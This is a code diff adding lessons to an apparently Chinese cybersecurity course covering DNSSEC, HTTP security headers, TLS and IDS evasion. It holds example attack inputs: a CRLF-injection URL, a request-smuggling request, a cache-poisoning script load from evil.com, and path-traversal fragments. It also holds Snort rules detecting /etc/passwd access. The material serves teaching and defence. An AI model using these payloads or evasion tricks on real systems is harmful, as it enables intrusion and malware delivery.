DNS 响应的真实性：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  无 DNSSEC:\r\n  DNS 响应 &gt; \"203.0.113.50\"\r\n  你无法验证这是不是真的\r\n\r\n  有 DNSSEC:\r\n  DNS 响应 &gt; \"203.0.113.50\" + 数字签名 (RRSIG)\r\n  客户端用公钥 (DNSKEY) 验证签名\r\n  签名有效 &gt; 接受结果\r\n  签名无效 &gt; 拒绝 (可能是缓存投毒!)\r\n\r\n  信任链:\r\n  根区签名 (Trust Anchor)\r\n    &gt; .cn TLD 签名 (DS record)\r\n      &gt; cyberedu.cn 签名 (DS record)\r\n        &gt; A 记录签名 (RRSIG)\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 检查域名是否部署了 DNSSEC:\r\ndig +dnssec cyberedu.cn\r\n\r\n# 验证 DNSSEC 链:\r\ndelv cyberedu.cn\r\n\r\n# 检查 DNSSEC 部署情况 (在线工具):\r\n# https://dnssec-analyzer.icann.org/\r\n</code></pre></div>\r\n\r\n<div class=\"callout default\"><div class=\"callout-title\">安全建议</div><p>作为防御者：(1) 部署 DNSSEC 防止缓存投毒；(2) 关闭开放递归防止放大攻击；(3) 监控 DNS 流量模式检测隧道；(4) 定期审计 CNAME 记录防止子域名接管；(5) 考虑使用 DoH (DNS over HTTPS) 或 DoT (DNS over TLS) 来加密 DNS 查询。</p></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(7)\">▶ DNS 查询工具</button>\r\n\r\n<div class=\"checkpoint\" data-cp=\"9\"></div>\r\n<div class=\"checkpoint\" data-cp=\"10\"></div>\r\n<div class=\"checkpoint\" data-cp=\"11\"></div>\r\n\r\n</section>";
+
+SECTION_CONTENT["net-04"] = "<section id=\"net-04\" data-content-key=\"net-04\" data-chapter=\"net-04\">\r\n\r\n<div class=\"section-transition\"><p>DNS 帮我们找到了服务器的 IP 地址，TCP 帮我们建立了连接——现在，终于轮到应用层的\"主角\"登场了：HTTP 协议。在这一节中，我们将深入 HTTP 请求和响应的每一个细节，并学习攻击者如何利用 HTTP 协议的弱点。</p></div>\r\n\r\n<h1>HTTP 协议深度与攻击：Web 安全的基石</h1>\r\n\r\n<p>HTTP（HyperText Transfer Protocol）是 Web 的基础协议。你每天打开的每一个网页、提交的每一个表单、调用的每一个 API，背后都是 HTTP 在工作。对于安全从业者来说，HTTP 是<strong>最重要的协议</strong>——因为 Web 应用是当今最常见的攻击目标。</p>\r\n\r\n<p>在这一节中，我们将从 Wireshark 的角度来解剖 HTTP 协议的每一个组成部分，然后从攻击者和防御者两个视角来学习 HTTP 的安全问题。</p>\r\n\r\n<h2>HTTP 请求的完整结构</h2>\r\n\r\n<p>一个 HTTP 请求由四部分组成：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────────────────────────────────────────────┐\r\n  │ 1. 请求行 (Request Line)                        │\r\n  │    方法 URI HTTP版本                             │\r\n  │    GET /api/users HTTP/1.1                       │\r\n  ├─────────────────────────────────────────────────┤\r\n  │ 2. 请求头 (Request Headers)                     │\r\n  │    Host: api.cyberedu.cn                         │\r\n  │    User-Agent: Mozilla/5.0                       │\r\n  │    Accept: application/json                      │\r\n  │    Authorization: Bearer eyJhbGciOi...           │\r\n  │    Cookie: session=abc123; theme=dark             │\r\n  │    Content-Length: 0                             │\r\n  │    Connection: keep-alive                        │\r\n  ├─────────────────────────────────────────────────┤\r\n  │ 3. 空行 (CRLF CRLF)                             │\r\n  │    \\r\\n                                          │\r\n  ├─────────────────────────────────────────────────┤\r\n  │ 4. 请求体 (Body) — 仅 POST/PUT/PATCH            │\r\n  │    {\"username\":\"admin\",\"password\":\"secret\"}      │\r\n  └─────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>让我们在 Wireshark 中看一个真实的 POST 请求：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Wireshark 过滤器: http.request\r\n\r\n  No.  Time     Source          Destination      Info\r\n  15   2.345    192.168.1.100   203.0.113.50     POST /api/login HTTP/1.1\r\n\r\n  展开 Hypertext Transfer Protocol:\r\n  ┌──────────────────────────────────────────────────────┐\r\n  │ Hypertext Transfer Protocol                          │\r\n  │   Request Line: POST /api/login HTTP/1.1\\r\\n        │\r\n  │     Request Method: POST                             │\r\n  │     Request URI: /api/login                          │\r\n  │     Request Version: HTTP/1.1                        │\r\n  │   Host: api.cyberedu.cn\\r\\n                         │\r\n  │   User-Agent: Mozilla/5.0 (Windows NT 10.0; ...)    │\r\n  │   Accept: application/json, text/plain, */*\\r\\n     │\r\n  │   Accept-Language: zh-CN,zh;q=0.9\\r\\n               │\r\n  │   Content-Type: application/json\\r\\n                 │\r\n  │   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...     │\r\n  │   Cookie: session=abc123def456; csrf_token=xyz\\r\\n  │\r\n  │   Content-Length: 52\\r\\n                             │\r\n  │   Connection: keep-alive\\r\\n                         │\r\n  │   \\r\\n                                               │\r\n  │   [Full request URI: http://api.cyberedu.cn/api/login]│\r\n  │                                                      │\r\n  │ JavaScript Object Notation                           │\r\n  │   {\"username\":\"admin\",\"password\":\"S3cret!@#\"}        │\r\n  └──────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全视角</div><p>注意这个请求中的敏感信息：<code>Authorization: Bearer</code> token 和 Cookie 中的 <code>session</code> 值。如果这是 HTTP（而非 HTTPS），这些凭证在传输中是<strong>明文</strong>的。Wireshark 可以轻松提取它们。</p></div>\r\n\r\n<h2>HTTP 方法与安全</h2>\r\n\r\n<p>HTTP 定义了多种方法（Method），每种方法有不同的语义和安全含义：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────┬─────────────────────┬──────────┬─────────────────────────┐\r\n  │ 方法    │ 用途                │ 幂等/安全 │ 安全风险                │\r\n  ├─────────┼─────────────────────┼──────────┼─────────────────────────┤\r\n  │ GET     │ 获取资源            │ 是/是    │ URL 参数泄露敏感数据    │\r\n  │ POST    │ 提交数据            │ 否/否    │ CSRF 攻击目标           │\r\n  │ PUT     │ 更新/创建资源       │ 是/否    │ 未授权的文件覆盖        │\r\n  │ DELETE  │ 删除资源            │ 是/否    │ 未授权删除              │\r\n  │ PATCH   │ 部分更新            │ 否/否    │ 注入攻击                │\r\n  │ OPTIONS │ 查询支持的方法      │ 是/是    │ CORS 配置泄露          │\r\n  │ HEAD    │ 获取头信息(无体)    │ 是/是    │ 信息泄露                │\r\n  │ TRACE   │ 回显请求(调试用)    │ 是/是    │ XST 跨站追踪攻击       │\r\n  └─────────┴─────────────────────┴──────────┴─────────────────────────┘\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 用 Wireshark 统计 HTTP 方法分布:\r\n# Statistics &gt; HTTP &gt; 查看请求方法统计\r\n\r\n# 用 tshark:\r\ntshark -r capture.pcap -Y \"http.request\" -T fields \\\r\n  -e http.request.method -e http.request.uri | sort | uniq -c | sort -rn\r\n\r\n# 检测危险方法:\r\n# Wireshark 过滤器:\r\nhttp.request.method == \"TRACE\" or http.request.method == \"DELETE\"\r\n</code></pre></div>\r\n\r\n<h2>HTTP 响应深度解析</h2>\r\n\r\n<p>服务器的 HTTP 响应同样由四部分组成：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────────────────────────────────────────────┐\r\n  │ 1. 状态行 (Status Line)                         │\r\n  │    HTTP/1.1 200 OK                               │\r\n  ├─────────────────────────────────────────────────┤\r\n  │ 2. 响应头 (Response Headers)                    │\r\n  │    Content-Type: application/json                │\r\n  │    Content-Length: 156                           │\r\n  │    Server: nginx/1.21.0                          │\r\n  │    Set-Cookie: session=xyz789; HttpOnly; Secure  │\r\n  │    X-Frame-Options: DENY                         │\r\n  │    X-Content-Type-Options: nosniff               │\r\n  │    Strict-Transport-Security: max-age=31536000   │\r\n  │    Content-Security-Policy: default-src 'self'   │\r\n  ├─────────────────────────────────────────────────┤\r\n  │ 3. 空行                                         │\r\n  │    \\r\\n                                          │\r\n  ├─────────────────────────────────────────────────┤\r\n  │ 4. 响应体 (Body)                                │\r\n  │    {\"status\":\"success\",\"user\":{\"id\":1,...}}      │\r\n  └─────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h3>安全相关的响应头</h3>\r\n\r\n<p>响应头中有一些专门用于安全的字段。以下是你在渗透测试和安全审计中必须检查的头：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ===== 必须存在的安全头 =====\r\n\r\n  1. Strict-Transport-Security (HSTS)\r\n     Strict-Transport-Security: max-age=31536000; includeSubDomains\r\n     作用: 强制浏览器使用 HTTPS，防止 SSL Strip 攻击\r\n     缺失风险: 降级攻击 (HTTPS &gt; HTTP)\r\n\r\n  2. Content-Security-Policy (CSP)\r\n     Content-Security-Policy: default-src 'self'; script-src 'self'\r\n     作用: 限制可加载的资源来源，防止 XSS\r\n     缺失风险: XSS 攻击更容易成功\r\n\r\n  3. X-Frame-Options\r\n     X-Frame-Options: DENY  或  SAMEORIGIN\r\n     作用: 防止页面被嵌入 iframe，防御点击劫持\r\n     缺失风险: 点击劫持攻击\r\n\r\n  4. X-Content-Type-Options\r\n     X-Content-Type-Options: nosniff\r\n     作用: 禁止浏览器猜测 MIME 类型\r\n     缺失风险: MIME 混淆攻击\r\n\r\n  5. X-XSS-Protection (旧浏览器)\r\n     X-XSS-Protection: 1; mode=block\r\n     作用: 启用浏览器内置 XSS 过滤器\r\n     注意: 现代浏览器已弃用，用 CSP 替代\r\n\r\n  ===== 信息泄露的头 =====\r\n\r\n  Server: nginx/1.21.0    ← 暴露服务器类型和版本!\r\n  X-Powered-By: PHP/8.1   ← 暴露后端技术栈!\r\n  X-AspNet-Version: 4.0   ← 暴露 .NET 版本!\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 在 Wireshark 中批量检查安全头:\r\n\r\n# 检查是否缺少 HSTS:\r\nhttp.response and not http.strict_transport_security\r\n\r\n# 检查是否缺少 CSP:\r\nhttp.response and not http.content_security_policy\r\n\r\n# 检查是否缺少 X-Frame-Options:\r\nhttp.response and not http.x_frame_options\r\n\r\n# 检查暴露服务器版本:\r\nhttp.server contains \"nginx\" or http.server contains \"Apache\"\r\n</code></pre></div>\r\n\r\n<h2>HTTP 状态码与安全含义</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────┬───────────────┬──────────────────────────────────────┐\r\n  │ 状态码  │ 含义          │ 安全含义                             │\r\n  ├─────────┼───────────────┼──────────────────────────────────────┤\r\n  │ 200     │ OK            │ 正常响应                             │\r\n  │ 301     │ 永久重定向    │ 开放重定向漏洞                       │\r\n  │ 302     │ 临时重定向    │ 开放重定向、OAuth 劫持               │\r\n  │ 304     │ 未修改        │ 缓存相关                             │\r\n  │ 400     │ 错误请求      │ 模糊测试的常见响应                   │\r\n  │ 401     │ 未认证        │ 暴力破解的目标                       │\r\n  │ 403     │ 禁止访问      │ 目录遍历、权限绕过                   │\r\n  │ 404     │ 未找到        │ 信息泄露、爬虫探测                   │\r\n  │ 405     │ 方法不允许    │ HTTP 方法枚举                        │\r\n  │ 500     │ 服务器错误    │ 注入攻击可能成功                     │\r\n  │ 502     │ 网关错误      │ 后端服务可能挂了                     │\r\n  │ 503     │ 服务不可用    │ 可能遭受了 DoS 攻击                  │\r\n  └─────────┴───────────────┴──────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h2>HTTP 攻击技术详解</h2>\r\n\r\n<h3>攻击一：HTTP 头注入 (Header Injection)</h3>\r\n\r\n<p>如果应用程序将用户输入直接放入 HTTP 响应头，攻击者可以通过注入 CRLF（回车换行）来篡改响应：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  漏洞代码 (简化):\r\n  # 将用户输入直接放入 Location 头\r\n  header(\"Location: /redirect?url=\" + user_input)\r\n\r\n  攻击者构造的输入:\r\n  /redirect?url=http://evil.com%0d%0aSet-Cookie:%20session=hacked\r\n\r\n  %0d%0a = \\r\\n (CRLF)\r\n\r\n  服务器实际生成的响应:\r\n  ┌──────────────────────────────────────────────────────────┐\r\n  │ HTTP/1.1 302 Found                                      │\r\n  │ Location: /redirect?url=http://evil.com                 │\r\n  │ Set-Cookie: session=hacked     ← 攻击者注入的!          │\r\n  │ Content-Type: text/html                                 │\r\n  └──────────────────────────────────────────────────────────┘\r\n\r\n  后果:\r\n  - 设置恶意 Cookie\r\n  - 注入恶意 JavaScript (XSS)\r\n  - 篡改缓存 (Cache Poisoning)\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 在 Wireshark 中检测 CRLF 注入:\r\n# 查找 URL 中包含 %0d%0a 的请求\r\nhttp.request.uri contains \"%0d%0a\"\r\nhttp.request.uri contains \"%0D%0A\"\r\nhttp.request.uri contains \"\\r\\n\"\r\n\r\n# 查找响应中异常的 Set-Cookie 头\r\nhttp.set_cookie and http.response.code == 302\r\n</code></pre></div>\r\n\r\n<h3>攻击二：HTTP 请求走私 (Request Smuggling)</h3>\r\n\r\n<p>这是近年来最受关注的高级 HTTP 攻击之一。当前端代理（如负载均衡器）和后端服务器对请求边界的理解不一致时，攻击者可以\"走私\"额外的请求：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  CL.TE 类型 (前端看 Content-Length，后端看 Transfer-Encoding):\r\n\r\n  攻击者发送:\r\n  ┌──────────────────────────────────────────────────────────┐\r\n  │ POST / HTTP/1.1                                         │\r\n  │ Host: target.com                                        │\r\n  │ Content-Length: 71                                      │\r\n  │ Transfer-Encoding: chunked                              │\r\n  │                                                         │\r\n  │ 0                                                       │\r\n  │                                                         │\r\n  │ GET /admin HTTP/1.1                                     │\r\n  │ Host: target.com                                        │\r\n  └──────────────────────────────────────────────────────────┘\r\n\r\n  前端 (Content-Length=71):\r\n  认为这是一个完整的 POST 请求 (71 字节)\r\n  全部转发给后端\r\n\r\n  后端 (Transfer-Encoding=chunked):\r\n  看到 \"0\\r\\n\\r\\n\" → chunk 结束 → POST 请求结束\r\n  剩余内容 \"GET /admin HTTP/1.1...\" 被视为新的请求!\r\n\r\n  结果:\r\n  攻击者绕过了前端的安全检查，直接访问了 /admin\r\n</code></pre></div>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">高级威胁</div><p>HTTP 请求走私可以导致：(1) 绕过 WAF 和认证；(2) 窃取其他用户的请求（包括 Cookie 和 Token）；(3) 缓存投毒。检测这种攻击需要对 HTTP 协议有非常深的理解。</p></div>\r\n\r\n<h3>攻击三：HTTP 响应拆分与缓存投毒</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  正常缓存行为:\r\n  CDN 缓存服务器:\r\n  Key = URL (如: /page?lang=zh)\r\n  Value = 响应内容\r\n\r\n  缓存投毒攻击:\r\n  攻击者发送:\r\n  GET /page?lang=zh HTTP/1.1\r\n  Host: target.com\r\n  X-Forwarded-Host: evil.com   ← 注入恶意 Host\r\n\r\n  服务器生成响应:\r\n  HTTP/1.1 200 OK\r\n  &lt;script src=\"https://evil.com/malware.js\"&gt;&lt;/script&gt;\r\n  (服务器使用了 X-Forwarded-Host 来构建 URL!)\r\n\r\n  CDN 将这个恶意响应缓存起来\r\n  后续所有访问 /page?lang=zh 的用户都会得到恶意页面!\r\n</code></pre></div>\r\n\r\n<h2>HTTPS 与 TLS 握手</h2>\r\n\r\n<p>HTTP 是明文的——任何人都可以窃听。<strong>HTTPS = HTTP + TLS</strong>，通过加密来保护传输中的数据。</p>\r\n\r\n<p>TLS 1.2 握手过程：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  客户端                                    服务器\r\n  ─────────                                 ─────────\r\n\r\n  ① ClientHello\r\n     支持的 TLS 版本\r\n     支持的密码套件列表\r\n     客户端随机数 (Client Random)\r\n     SNI: cyberedu.cn          ──────────&gt;\r\n\r\n                                            ② ServerHello\r\n                                               选定的密码套件\r\n                                               服务器随机数\r\n                                               证书 (含公钥)\r\n                                  &lt;──────────\r\n\r\n  ③ 客户端验证证书\r\n     - 检查证书链\r\n     - 检查域名匹配\r\n     - 检查有效期\r\n     - 检查是否被吊销\r\n\r\n  ④ 密钥交换\r\n     (RSA: 用公钥加密 Pre-Master Secret)\r\n     (ECDHE: Diffie-Hellman 密钥交换)\r\n                                   ──────────&gt;\r\n\r\n                                            ⑤ 双方计算会话密钥\r\n                                               Master Secret =\r\n                                               PRF(Pre-Master,\r\n                                                   Client Random,\r\n                                                   Server Random)\r\n\r\n  ⑥ ChangeCipherSpec + Finished\r\n                                   ──────────&gt;\r\n                                            ⑦ ChangeCipherSpec + Finished\r\n                                  &lt;──────────\r\n\r\n  ═══════════════════════════════════════════════\r\n  TLS 连接建立! 后续 HTTP 数据全部加密传输\r\n  ═══════════════════════════════════════════════\r\n</code></pre></div>\r\n\r\n<p>在 Wireshark 中，TLS 握手是这样显示的：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Wireshark 过滤器: tls\r\n\r\n  No.  Time     Source          Destination      Info\r\n  1    0.000    192.168.1.100   203.0.113.50     Client Hello\r\n  2    0.045    203.0.113.50    192.168.1.100    Server Hello, Certificate\r\n  3    0.046    203.0.113.50    192.168.1.100    Server Key Exchange, Server Hello Done\r\n  4    0.048    192.168.1.100   203.0.113.50     Client Key Exchange\r\n  5    0.049    192.168.1.100   203.0.113.50     Change Cipher Spec, Encrypted Handshake\r\n  6    0.095    203.0.113.50    192.168.1.100    Change Cipher Spec, Encrypted Handshake\r\n  7    0.096    192.168.1.100   203.0.113.50     Application Data  ← 加密的 HTTP!\r\n  8    0.140    203.0.113.50    192.168.1.100    Application Data  ← 加密的 HTTP!\r\n\r\n  展开 Client Hello:\r\n  ┌────────────────────────────────────────────────┐\r\n  │ TLSv1.2 Record Layer: Handshake Protocol       │\r\n  │   Content Type: Handshake (22)                 │\r\n  │   Version: TLS 1.2 (0x0303)                   │\r\n  │   Handshake Type: Client Hello (1)             │\r\n  │   Version: TLS 1.2 (0x0303)                   │\r\n  │   Random: 5f a3 b2 c1 ...                     │\r\n  │   Session ID Length: 0                         │\r\n  │   Cipher Suites Length: 36                     │\r\n  │   Cipher Suites (18 suites):                   │\r\n  │     TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384     │\r\n  │     TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256     │\r\n  │     TLS_RSA_WITH_AES_256_GCM_SHA384           │\r\n  │     ...                                        │\r\n  │   Extensions:                                  │\r\n  │     server_name: cyberedu.cn    ← SNI!        │\r\n  │     supported_versions: TLS 1.3, TLS 1.2      │\r\n  │     signature_algorithms: ...                  │\r\n  └────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>注意 <strong>SNI (Server Name Indication)</strong>：即使使用了 TLS 加密，Client Hello 中的 SNI 字段仍然是明文的！这意味着 ISP 或中间人可以知道你访问的是哪个域名（虽然不知道具体 URL 路径）。这也是为什么 ESNI/ECH（加密 SNI）正在被推广。</p></div>\r\n\r\n<h3>TLS 相关的安全问题</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 检查服务器支持的 TLS 版本和密码套件:\r\nnmap --script ssl-enum-ciphers -p 443 target.com\r\n\r\n# 检查证书详情:\r\nopenssl s_client -connect target.com:443 -servername target.com\r\n\r\n# 检查是否支持弱密码:\r\nopenssl s_client -connect target.com:443 -cipher DES-CBC3-SHA\r\n\r\n# 检查证书是否过期:\r\nopenssl s_client -connect target.com:443 2&gt;/dev/null | openssl x509 -noout -dates\r\n\r\n# Wireshark 过滤器: 查找使用弱 TLS 版本的连接\r\ntls.handshake.version &lt; 0x0303   # 低于 TLS 1.2\r\n</code></pre></div>\r\n\r\n<h2>HTTP/2 与 HTTP/3 简介</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  HTTP/1.1 vs HTTP/2 vs HTTP/3:\r\n\r\n  ┌──────────┬────────────────┬────────────────┬────────────────┐\r\n  │ 特性     │ HTTP/1.1       │ HTTP/2         │ HTTP/3         │\r\n  ├──────────┼────────────────┼────────────────┼────────────────┤\r\n  │ 传输层   │ TCP            │ TCP            │ UDP (QUIC)     │\r\n  │ 多路复用 │ 否 (队头阻塞)  │ 是 (流)        │ 是 (流)        │\r\n  │ 头部压缩 │ 无             │ HPACK          │ QPACK          │\r\n  │ 服务器推送│ 无             │ 有             │ 有             │\r\n  │ 加密     │ 可选           │ 事实强制       │ 强制           │\r\n  │ Wireshark│ 完整解析       │ 完整解析       │ 需要 QUIC 插件 │\r\n  └──────────┴────────────────┴────────────────┴────────────────┘\r\n\r\n  HTTP/2 的帧结构:\r\n  ┌────────────────────────────────────┐\r\n  │ Frame Header (9 bytes)             │\r\n  │ ┌──────┬──────┬───────┬──────────┐│\r\n  │ │Length│ Type │ Flags │Stream ID ││\r\n  │ │ 3B   │ 1B   │ 1B    │ 4B       ││\r\n  │ └──────┴──────┴───────┴──────────┘│\r\n  │ Frame Payload (变长)               │\r\n  └────────────────────────────────────┘\r\n\r\n  Type: HEADERS(0x01), DATA(0x00), SETTINGS(0x04), ...\r\n</code></pre></div>\r\n\r\n<h2>动手实验</h2>\r\n\r\n<ol>\r\n  <li>打开 Wireshark，开始捕获</li>\r\n  <li>用浏览器访问 <code>http://example.com</code>（HTTP），观察完整的请求和响应头</li>\r\n  <li>再访问 <code>https://example.com</code>（HTTPS），对比差异——你只能看到 TLS 握手和加密的 Application Data</li>\r\n  <li>检查不同网站的安全头：用 Wireshark 过滤器 <code>http.response</code> 查看响应头中是否包含 HSTS、CSP、X-Frame-Options</li>\r\n  <li>尝试用 <code>curl -v http://example.com</code> 查看完整的 HTTP 交互</li>\r\n</ol>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 使用 curl 详细查看 HTTP 交互:\r\ncurl -v http://example.com\r\n\r\n# 查看所有响应头:\r\ncurl -I http://example.com\r\n\r\n# 发送 POST 请求:\r\ncurl -X POST http://example.com/api/login \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"username\":\"admin\",\"password\":\"test\"}'\r\n\r\n# 使用指定的 TLS 版本:\r\ncurl --tlsv1.2 -v https://example.com\r\n\r\n# 查看证书信息:\r\ncurl -vI https://example.com 2&gt;&amp;1 | grep -i \"SSL\\|subject\\|issuer\\|expire\"\r\n</code></pre></div>\r\n\r\n<div class=\"callout default\"><div class=\"callout-title\">小结</div><p>HTTP 是 Web 安全的基础。作为攻击者，你需要理解每个 HTTP 头和方法的含义来发现漏洞。作为防御者，你需要确保正确使用安全头、强制 HTTPS、验证所有输入、并且了解 HTTP 请求走私等高级攻击。</p></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"12\"></div>\r\n<div class=\"checkpoint\" data-cp=\"13\"></div>\r\n<div class=\"checkpoint\" data-cp=\"14\"></div>\r\n\r\n</section>";
+
+SECTION_CONTENT["net-05"] = "<section id=\"net-05\" data-content-key=\"net-05\" data-chapter=\"net-05\">\r\n\r\n<div class=\"section-transition\"><p>从 TCP 握手到 DNS 查询再到 HTTP 通信，我们已经跟随数据包走完了整个网络旅程。但在真实世界中，数据包的路上不只有路由器——还有防火墙和 IDS 在\"审查\"每一个包。作为渗透测试人员，你需要学会如何让数据包穿过这些防线；作为防御者，你需要理解攻击者会用什么手法来规避检测。</p></div>\r\n\r\n<h1>防火墙绕过与 IDS 规避：攻防两端的博弈</h1>\r\n\r\n<p>在之前的章节中，我们学习了数据包如何从客户端到达服务器。但在真实的企业网络中，这条路上布满了\"关卡\"——防火墙（Firewall）和入侵检测系统（IDS/IPS）会检查每一个经过的数据包，决定是放行还是拦截。</p>\r\n\r\n<p>作为渗透测试人员，你需要了解这些防御设备的工作原理，才能找到绕过它们的方法。作为安全工程师，你需要理解攻击者的绕过手法，才能部署更有效的防御。</p>\r\n\r\n<h2>防火墙类型与工作原理</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌──────────────────────────────────────────────────────────────────┐\r\n  │                   防火墙演进                                     │\r\n  │                                                                  │\r\n  │ 第一代: 包过滤防火墙 (Packet Filter)                             │\r\n  │   检查: 源IP、目标IP、端口、协议                                 │\r\n  │   速度: 极快                                                     │\r\n  │   缺点: 不检查内容，不跟踪连接状态                                │\r\n  │                                                                  │\r\n  │ 第二代: 状态检测防火墙 (Stateful)                                │\r\n  │   检查: 上述 + 连接状态 (SYN/ACK/FIN)                           │\r\n  │   维护连接跟踪表 (Connection Tracking Table)                     │\r\n  │   缺点: 不检查应用层内容                                         │\r\n  │                                                                  │\r\n  │ 第三代: 应用层防火墙 (Application Layer / WAF)                   │\r\n  │   检查: 上述 + HTTP 内容、SQL 注入模式、XSS 模式                 │\r\n  │   可以理解应用层协议                                             │\r\n  │   缺点: 性能开销大，可能被编码绕过                                │\r\n  │                                                                  │\r\n  │ 下一代: NGFW (Next-Generation Firewall)                          │\r\n  │   检查: 上述 + 用户身份、应用程序识别、威胁情报                   │\r\n  │   集成 IPS、防病毒、URL 过滤                                     │\r\n  └──────────────────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h2>IDS/IPS 的检测机制</h2>\r\n\r\n<p>IDS（入侵检测系统）和 IPS（入侵防御系统）使用多种方法来识别恶意流量：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌──────────────────┬────────────────────────────────────────────┐\r\n  │ 检测方法         │ 说明                                       │\r\n  ├──────────────────┼────────────────────────────────────────────┤\r\n  │ 签名匹配         │ 与已知攻击的特征码对比                      │\r\n  │ (Signature)      │ 如: Snort 规则 \"alert tcp any any -&gt;       │\r\n  │                  │ $HOME_NET 80 (content:\"/etc/passwd\")\"      │\r\n  ├──────────────────┼────────────────────────────────────────────┤\r\n  │ 异常检测         │ 偏离正常基线的行为                          │\r\n  │ (Anomaly)        │ 如: 单 IP 在 1 秒内发起 1000 个连接        │\r\n  ├──────────────────┼────────────────────────────────────────────┤\r\n  │ 协议分析         │ 检查协议是否符合 RFC 规范                   │\r\n  │ (Protocol)       │ 如: HTTP 方法不在标准列表中                 │\r\n  ├──────────────────┼────────────────────────────────────────────┤\r\n  │ 启发式分析       │ 基于行为模式的智能判断                      │\r\n  │ (Heuristic)      │ 如: Shellcode 特征的熵值分析                │\r\n  └──────────────────┴────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>一个典型的 Snort/Suricata IDS 规则：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  # 检测 SQL 注入尝试\r\n  alert tcp $EXTERNAL_NET any -&gt; $HOME_NET $HTTP_PORTS ( \\\r\n    msg:\"SQL Injection attempt detected\"; \\\r\n    flow:to_server,established; \\\r\n    content:\"UNION\"; nocase; \\\r\n    content:\"SELECT\"; nocase; distance:0; \\\r\n    pcre:\"/UNION\\s+(ALL\\s+)?SELECT/i\"; \\\r\n    classtype:web-application-attack; \\\r\n    sid:1000001; rev:3; \\\r\n  )\r\n\r\n  # 检测 /etc/passwd 文件访问\r\n  alert tcp $EXTERNAL_NET any -&gt; $HOME_NET $HTTP_PORTS ( \\\r\n    msg:\"Path traversal /etc/passwd attempt\"; \\\r\n    flow:to_server,established; \\\r\n    content:\"/etc/passwd\"; \\\r\n    classtype:web-application-attack; \\\r\n    sid:1000002; rev:1; \\\r\n  )\r\n</code></pre></div>\r\n\r\n<h2>绕过技术一：IP 分片 (Fragmentation)</h2>\r\n\r\n<p>IP 分片是最经典的绕过手法。原理是：把一个数据包拆成多个小片段，使得每个片段单独看起来都不包含完整的攻击特征。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  原始包 (包含攻击特征 \"/etc/passwd\"):\r\n  ┌─────────────────────────────────────────────┐\r\n  │ GET /../../etc/passwd HTTP/1.1              │\r\n  └─────────────────────────────────────────────┘\r\n       ^^^^^^^^^^^^^^^\r\n       IDS 签名匹配: 报警!\r\n\r\n  分片后 (每个片段不包含完整签名):\r\n  ┌────────────────────────┐\r\n  │ Fragment 1 (offset=0): │\r\n  │ GET /../../etc         │  ← 不包含完整 \"/etc/passwd\"\r\n  └────────────────────────┘\r\n  ┌────────────────────────┐\r\n  │ Fragment 2 (offset=N): │\r\n  │ /passwd HTTP/1.1       │  ← 不包含完整 \"/etc/passwd\"\r\n  └────────────────────────┘\r\n\r\n  IDS 看到的:\r\n  Fragment 1: \"GET /../../etc\"  → 无匹配\r\n  Fragment 2: \"/passwd HTTP/1.1\" → 无匹配\r\n\r\n  目标服务器重组后:\r\n  